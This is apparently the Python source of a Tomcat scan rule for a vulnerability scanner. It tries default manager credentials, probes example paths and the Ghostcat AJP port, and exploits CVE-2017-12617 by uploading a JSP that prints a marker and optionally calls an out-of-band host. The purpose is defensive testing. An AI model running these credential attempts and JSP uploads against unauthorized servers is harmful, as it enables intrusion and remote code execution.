# Filename: VulnerabilityChecks/ApacheTomcatScanRule.py

import asyncio
import logging
import random
import string
import uuid
import urllib.parse
import base64 # For Basic Auth
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, Set

import aiohttp
# from bs4 import BeautifulSoup # Can be added if more complex HTML parsing is needed

# --- Alert Dataclass ---
@dataclass
class TomcatVulnerabilityAlert:
    # Non-default arguments first
    cwe_id: int
    name: str
    description: str
    uri: str
    
    # Default arguments follow
    wasc_id: Optional[int] = None
    attack_details: Dict[str, Any] = field(default_factory=dict)
    evidence: str = ""
    solution: str = (
        "Upgrade Apache Tomcat to the latest secure version. "
        "Apply security configurations as per Tomcat documentation (e.g., secure manager apps, disable unused connectors, remove default apps). "
        "Regularly review CVEs and apply patches."
    )
    reference: str = ""
    risk: int = 3
    confidence: int = 2
    alert_tags: Dict[str, str] = field(default_factory=dict)

    def as_dict(self) -> Dict[str, Any]:
        return {
            "vulnerability_type": self.alert_tags.get("Vulnerability", "Tomcat_Vulnerability"),
            "type": self.name,
            "detail": self.description,
            "payload_used": str(self.attack_details.get("payload", self.attack_details.get("credentials", "N/A"))),
            "injection_point_info": f"{self.attack_details.get('location', 'N/A')}: {self.attack_details.get('path', self.attack_details.get('port', 'N/A'))}",
            "url_tested": self.uri,
            "severity": {1: "Info", 2: "Low", 3: "Medium", 4: "High"}.get(self.risk, "Unknown"),
            "confidence": {1: "Low", 2: "Medium", 3: "High"}.get(self.confidence, "Unknown"),
            "evidence": self.evidence,
            "solution": self.solution,
            "reference": self.reference,
            "cwe_id": self.cwe_id,
            "wasc_id": self.wasc_id if self.wasc_id else 0,
            "alert_tags": self.alert_tags,
            "other_info": f"Attack Details: {self.attack_details}"
        }

# --- Main Scan Rule Class ---
class ApacheTomcatScanRule:
    tech_required: Set[str] = {"apache tomcat", "tomcat"} # Trigger if "tomcat" or "apache tomcat" is detected

    DEFAULT_MANAGER_PATHS = ["/manager/html", "/host-manager/html", "/manager/status"]
    DEFAULT_TOMCAT_CREDS = [
        ("tomcat", "tomcat"), ("admin", "admin"), ("admin", "s3cret"),
        ("tomcat", "s3cret"), ("admin", "tomcat"), ("manager", "manager"),
        ("role1", "role1"), ("both", "both"), # Common in some default setups
        ("", ""), # Try empty credentials (anonymous)
    ]
    TOMCAT_EXAMPLE_PATHS = ["/examples/", "/docs/"]
    AJP_DEFAULT_PORT = 8009

    PUT_RCE_TEST_FILENAME_TEMPLATE = "test_put_rce_{random_hex}.jsp"
    PUT_RCE_MARKER = "TOMCAT_PUT_RCE_SUCCESS_MARKER"
    PUT_RCE_OAST_MARKER_SUFFIX = "_OAST_ATTEMPTED"

    def __init__(self,
                 parent_logger: Optional[logging.Logger] = None,
                 oast_base_url: Optional[str] = None,
                 http_timeout: float = 20.0,
                 active_scan_async_q: Optional[asyncio.Queue] = None
                 ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.oast_base_url = self._normalize_oast_url(oast_base_url) if oast_base_url else None
        self.http_timeout = http_timeout
        self.active_scan_async_q = active_scan_async_q

    def _normalize_oast_url(self, url: str) -> Optional[str]:
        if not url: return None
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc if parsed.netloc else None

    async def _send_request(
        self, session: aiohttp.ClientSession, method: str, url: str,
        headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None,
        data: Optional[Any] = None, allow_redirects: bool = True # Manager apps often redirect
    ) -> Tuple[Optional[aiohttp.ClientResponse], str, Dict[str, str], Optional[bytes]]:
        req_headers = (headers or {}).copy()
        if "User-Agent" not in req_headers:
            req_headers["User-Agent"] = f"TomcatSecurityScanner/1.0 ({uuid.uuid4().hex[:8]})"

        self.logger.debug(f"TomcatScan: {method} {url}, Headers: {req_headers.keys()}, Data: {str(data)[:100] if data else 'None'}")
        resp_text, resp_headers_dict, resp_bytes = "", {}, None
        resp_obj = None
        try:
            timeout = aiohttp.ClientTimeout(total=self.http_timeout)
            async with session.request(
                method.upper(), url, headers=req_headers, params=params, data=data,
                timeout=timeout, allow_redirects=allow_redirects
            ) as resp:
                resp_obj = resp
                try:
                    resp_bytes = await resp.read()
                    resp_text = resp_bytes.decode(errors='replace')
                except Exception as e_read:
                    self.logger.warning(f"Error reading response from {url}: {e_read}")
                resp_headers_dict = dict(resp.headers)
                self.logger.debug(f"TomcatScan: Response from {url}: Status {resp.status}, Final URL: {resp.url}")
        except asyncio.TimeoutError:
            self.logger.warning(f"TomcatScan: Request to {url} timed out.")
        except aiohttp.ClientError as e:
            self.logger.warning(f"TomcatScan: Request to {url} client error: {e}")
        except Exception as e_req:
            self.logger.error(f"TomcatScan: Unexpected error for {url}: {e_req}")
        return resp_obj, resp_text, resp_headers_dict, resp_bytes

    async def _emit_alert(self, alert_obj: TomcatVulnerabilityAlert):
        if self.active_scan_async_q:
            try:
                await self.active_scan_async_q.put({
                    "type": "active_scan_alert", "alert": alert_obj.as_dict()
                })
                self.logger.info(f"TomcatScan: Emitted alert - {alert_obj.name} for {alert_obj.uri}")
            except Exception as e:
                self.logger.error(f"TomcatScan: Failed to emit alert to queue: {e}")
        else:
            self.logger.warning(f"TomcatScan: Async queue not available. Alert not emitted: {alert_obj.name}")

    # --- CVE/Check Methods ---

    async def _check_manager_apps(self, session: aiohttp.ClientSession, base_app_url: str):
        for path in self.DEFAULT_MANAGER_PATHS:
            target_url = urllib.parse.urljoin(base_app_url, path.lstrip('/'))
            
            # 1. Try unauthenticated access first
            self.logger.debug(f"TomcatManager: Checking unauthenticated access to {target_url}")
            resp_obj, resp_text, _, _ = await self._send_request(session, "GET", target_url)
            
            is_manager_page = "Tomcat Web Application Manager" in resp_text or \
                              "Tomcat Virtual Host Manager" in resp_text or \
                              "Server Status" in resp_text # For /manager/status

            if resp_obj and resp_obj.status == 200 and is_manager_page:
                alert = TomcatVulnerabilityAlert(
                    cwe_id=287, wasc_id=1, # Improper Authentication / Insufficient Authentication
                    name=f"Apache Tomcat Manager Application Exposed Unauthenticated ({path})",
                    description=f"The Tomcat manager interface at '{path}' is accessible without authentication.",
                    uri=target_url,
                    attack_details={"path": path, "method": "GET", "location": "direct_path"},
                    evidence=f"HTTP 200 and manager page content found at {target_url} without credentials.",
                    reference="https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Configuring_Manager_Application_Access",
                    risk=4, confidence=3,
                    alert_tags={"Vulnerability": "AuthBypass", "Interface": "ManagerApp"}
                )
                await self._emit_alert(alert)
                continue # Found unauth access, no need to check creds for this path

            # 2. Try default credentials if unauthenticated access failed (e.g. got 401/403)
            if resp_obj and resp_obj.status in [401, 403]: # HTTP Basic Auth or Forbidden
                for username, password in self.DEFAULT_TOMCAT_CREDS:
                    self.logger.debug(f"TomcatManager: Trying {username}:{password} for {target_url}")
                    auth_header = {}
                    if username or password: # Avoid empty Authorization header if both are empty
                        creds_b64 = base64.b64encode(f"{username}:{password}".encode()).decode()
                        auth_header["Authorization"] = f"Basic {creds_b64}"
                    
                    resp_obj_auth, resp_text_auth, _, _ = await self._send_request(session, "GET", target_url, headers=auth_header)
                    
                    is_manager_page_auth = "Tomcat Web Application Manager" in resp_text_auth or \
                                           "Tomcat Virtual Host Manager" in resp_text_auth or \
                                           "Server Status" in resp_text_auth

                    if resp_obj_auth and resp_obj_auth.status == 200 and is_manager_page_auth:
                        alert = TomcatVulnerabilityAlert(
                            cwe_id=521, wasc_id=14, # Weak Password Requirements / Default Credentials
                            name=f"Apache Tomcat Manager Application Accessible with Default/Weak Credentials ({path})",
                            description=f"The Tomcat manager interface at '{path}' is accessible with credentials: {username}/{'*'*len(password) if password else '(empty)'}.",
                            uri=target_url,
                            attack_details={"path": path, "credentials": f"{username}:{password}", "method": "GET", "location": "direct_path_auth"},
                            evidence=f"HTTP 200 and manager page content found at {target_url} with credentials '{username}'.",
                            reference="https://cheatsheetseries.owasp.org/cheatsheets/Securing_tomcat_Cheat_Sheet.html",
                            risk=4, confidence=3,
                            alert_tags={"Vulnerability": "DefaultCredentials", "Interface": "ManagerApp"}
                        )
                        await self._emit_alert(alert)
                        break # Found working creds for this path, move to next path

    async def _check_put_rce_cve201712617(self, session: aiohttp.ClientSession, base_app_url: str):
        cve_id = "CVE-2017-12617"
        random_hex = uuid.uuid4().hex[:8]
        test_filename = self.PUT_RCE_TEST_FILENAME_TEMPLATE.format(random_hex=random_hex)
        test_url = urllib.parse.urljoin(base_app_url, test_filename) # PUT to root by default

        jsp_payload_content = f"<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n<% out.println(\"{self.PUT_RCE_MARKER}\"); %>"
        oast_interaction_id = None

        if self.oast_base_url:
            oast_domain = self._normalize_oast_url(self.oast_base_url)
            if oast_domain:
                oast_interaction_id = f"tomcatput_{random_hex}"
                oast_target_url = f"http://{oast_interaction_id}.{oast_domain}"
                jsp_payload_content = (
                    f"<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n"
                    f"<%@ page import=\"java.net.URL,java.net.HttpURLConnection,java.io.InputStream\" %>\n"
                    f"<%\n"
                    f"  try {{\n"
                    f"    URL url = new URL(\"{oast_target_url}\");\n"
                    f"    HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n"
                    f"    conn.setRequestMethod(\"GET\"); conn.setConnectTimeout(3000); conn.setReadTimeout(3000);\n"
                    f"    InputStream is = conn.getInputStream(); is.close(); // Just make the request\n"
                    f"  }} catch (Exception e) {{ e.printStackTrace(out); }}\n"
                    f"  out.println(\"{self.PUT_RCE_MARKER}{self.PUT_RCE_OAST_MARKER_SUFFIX}\");\n"
                    f"%>"
                )

        self.logger.debug(f"TomcatPutRCE ({cve_id}): Attempting to PUT JSP to {test_url}")
        put_headers = {"Content-Type": "application/octet-stream"} # Or text/plain
        resp_obj_put, _, _, _ = await self._send_request(session, "PUT", test_url, headers=put_headers, data=jsp_payload_content.encode('utf-8'))

        if resp_obj_put and resp_obj_put.status in [201, 204]: # 201 Created or 204 No Content (success)
            self.logger.info(f"TomcatPutRCE ({cve_id}): PUT request to {test_url} successful (Status: {resp_obj_put.status}). Verifying execution...")
            
            # Verify by GETting the uploaded file
            await asyncio.sleep(0.5) # Small delay for file system to sync
            resp_obj_get, resp_text_get, _, _ = await self._send_request(session, "GET", test_url)

            rce_confirmed = False
            evidence_str = f"PUT successful (HTTP {resp_obj_put.status}). "
            if resp_obj_get and resp_obj_get.status == 200:
                evidence_str += f"GET successful (HTTP {resp_obj_get.status}). "
                if self.PUT_RCE_MARKER in resp_text_get:
                    rce_confirmed = True
                    evidence_str += f"Marker '{self.PUT_RCE_MARKER}' found in response. "
                    if self.PUT_RCE_OAST_MARKER_SUFFIX in resp_text_get and oast_interaction_id:
                        evidence_str += f"OAST interaction attempted (ID: {oast_interaction_id})."

            if rce_confirmed:
                alert = TomcatVulnerabilityAlert(
                    cwe_id=434, wasc_id=15, # Unrestricted Upload of File with Dangerous Type / Application Misconfiguration
                    name=f"Apache Tomcat RCE via JSP PUT ({cve_id})",
                    description=f"Vulnerability CVE-2017-12617 allows RCE by PUTting a JSP file. This is often due to 'readonly' being false for DefaultServlet on Windows or misconfiguration.",
                    uri=test_url,
                    attack_details={"cve": cve_id, "method": "PUT/GET", "path": test_filename, "payload": "JSP with marker/OAST call"},
                    evidence=evidence_str,
                    reference=f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                    risk=4, confidence=3,
                    alert_tags={"CVE": cve_id, "Vulnerability": "RCE", "Method": "PUT", "OAST_Interaction": "ContentCheck" if oast_interaction_id else "None"}
                )
                await self._emit_alert(alert)

            # Cleanup: Attempt to DELETE the uploaded file
            self.logger.debug(f"TomcatPutRCE ({cve_id}): Attempting to DELETE {test_url}")
            await self._send_request(session, "DELETE", test_url)
        else:
            self.logger.debug(f"TomcatPutRCE ({cve_id}): PUT request to {test_url} failed or was not accepted (Status: {resp_obj_put.status if resp_obj_put else 'N/A'}).")

    async def _check_ajp_ghostcat_cve20201938(self, session: aiohttp.ClientSession, target_host: str):
        cve_id = "CVE-2020-1938"
        ajp_port = self.AJP_DEFAULT_PORT
        self.logger.debug(f"TomcatGhostcat ({cve_id}): Checking AJP port {ajp_port} on {target_host}")

        try:
            # Attempt to establish a TCP connection to the AJP port
            reader, writer = await asyncio.open_connection(target_host, ajp_port)
            writer.close()
            await writer.wait_closed()
            self.logger.info(f"TomcatGhostcat ({cve_id}): AJP port {ajp_port} on {target_host} is open.")

            # At this point, the port is open. Actual LFI/RCE exploitation via AJP
            # requires crafting specific AJP packets, which is complex.
            # We will report the open port and potential vulnerability.
            alert = TomcatVulnerabilityAlert(
                cwe_id=200, wasc_id=33, # Information Exposure / Path Traversal (for LFI aspect)
                name=f"Apache Tomcat AJP Connector Exposed (Potential Ghostcat LFI/RCE - {cve_id})",
                description=(
                    f"The AJP connector on port {ajp_port} is exposed. This could make the server vulnerable to "
                    f"Ghostcat (CVE-2020-1938), allowing LFI and potential RCE if misconfigured. "
                    f"Direct AJP packet crafting is needed for full confirmation."
                ),
                uri=f"ajp://{target_host}:{ajp_port}",
                attack_details={"cve": cve_id, "port": ajp_port, "protocol": "AJP", "location": "network_port"},
                evidence=f"Successfully connected to AJP port {ajp_port} on {target_host}. Further testing with AJP tools recommended.",
                reference=f"https://nvd.nist.gov/vuln/detail/{cve_id}, https://www.chaitin.cn/en/ghostcat",
                risk=3, confidence=2, # Confidence is medium as we only confirmed port open
                alert_tags={"CVE": cve_id, "Vulnerability": "LFI/RCE_Potential", "Connector": "AJP"}
            )
            await self._emit_alert(alert)

        except ConnectionRefusedError:
            self.logger.debug(f"TomcatGhostcat ({cve_id}): AJP port {ajp_port} on {target_host} is closed or firewalled.")
        except asyncio.TimeoutError:
            self.logger.debug(f"TomcatGhostcat ({cve_id}): Connection to AJP port {ajp_port} on {target_host} timed out.")
        except Exception as e:
            self.logger.warning(f"TomcatGhostcat ({cve_id}): Error checking AJP port {ajp_port} on {target_host}: {e}")

    async def _check_example_docs_exposure(self, session: aiohttp.ClientSession, base_app_url: str):
        for path in self.TOMCAT_EXAMPLE_PATHS:
            target_url = urllib.parse.urljoin(base_app_url, path.lstrip('/'))
            self.logger.debug(f"TomcatExamples: Checking {target_url}")
            resp_obj, resp_text, _, _ = await self._send_request(session, "GET", target_url)

            if resp_obj and resp_obj.status == 200:
                # Basic check for Tomcat-specific content
                if "Apache Tomcat Examples" in resp_text or "Apache Tomcat Documentation" in resp_text or \
                   "Servlet Examples" in resp_text or "JSP Examples" in resp_text:
                    alert = TomcatVulnerabilityAlert(
                        cwe_id=200, wasc_id=13, # Information Exposure
                        name=f"Apache Tomcat Default Examples/Documentation Exposed ({path})",
                        description=f"Default Tomcat examples or documentation found at '{path}'. These can reveal version information and potentially contain sample code with vulnerabilities.",
                        uri=target_url,
                        attack_details={"path": path, "method": "GET", "location": "direct_path"},
                        evidence=f"HTTP 200 and Tomcat example/doc content found at {target_url}. Snippet: {resp_text[:150]}",
                        reference="https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html#Default_web_applications",
                        risk=1, confidence=3, # Low risk, but high confidence if found
                        alert_tags={"Vulnerability": "InformationDisclosure", "Type": "DefaultApplication"}
                    )
                    await self._emit_alert(alert)

    # --- Main Scan Orchestration Method ---
    async def scan(
        self,
        base_app_url: str, # Base URL of the Tomcat application (e.g., http://victim.com/)
        aiohttp_session: aiohttp.ClientSession,
        # These arguments are for compatibility with how ActiveVulnerabilityCheck might call scanners
        # but for Tomcat, most checks are URL/server-based rather than parameter-based.
        original_url: Optional[str] = None, # The specific URL that triggered this scan
        original_headers: Optional[Dict[str, str]] = None,
        original_cookies: Optional[Dict[str, str]] = None,
        injection_details: Optional[Dict[str, Any]] = None, # Usually None for these Tomcat checks
        html_content: Optional[str] = None
    ):
        self.logger.info(f"ApacheTomcatScanRule: Starting scan for base_url='{base_app_url}'")
        
        # Ensure base_app_url ends with a slash for urljoin
        if not base_app_url.endswith('/'):
            normalized_base_app_url = base_app_url + '/'
        else:
            normalized_base_app_url = base_app_url
        
        target_host = urllib.parse.urlparse(normalized_base_app_url).hostname
        if not target_host:
            self.logger.error(f"TomcatScan: Could not determine hostname from base_app_url: {normalized_base_app_url}")
            return

        # Perform checks
        await self._check_manager_apps(aiohttp_session, normalized_base_app_url)
        await self._check_example_docs_exposure(aiohttp_session, normalized_base_app_url)
        await self._check_put_rce_cve201712617(aiohttp_session, normalized_base_app_url)
        await self._check_ajp_ghostcat_cve20201938(aiohttp_session, target_host)
        
        self.logger.info(f"ApacheTomcatScanRule: Scan finished for {normalized_base_app_url}")